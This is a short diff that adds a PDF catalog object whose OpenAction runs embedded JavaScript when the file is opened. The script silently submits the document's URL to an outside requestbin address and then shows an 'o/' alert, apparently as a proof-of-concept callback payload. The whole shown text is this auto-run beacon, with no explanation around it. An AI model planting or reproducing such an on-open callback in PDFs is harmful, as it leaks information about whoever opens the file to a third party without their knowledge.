@@ -1,0 +1,16 @@
+1 0 obj
+<<
+/Type /Catalog
+/OpenAction <<
+/S /JavaScript
+/JS (
+(function() {
+this.submitForm("http://requestbin.net/r/19lxsht1?url="+URL, true, false, "name");
+})();
+app.alert("o/");
+)
+>>
+/Outlines 2 0 R
+/Pages 3 0 R
+>>
+endobj
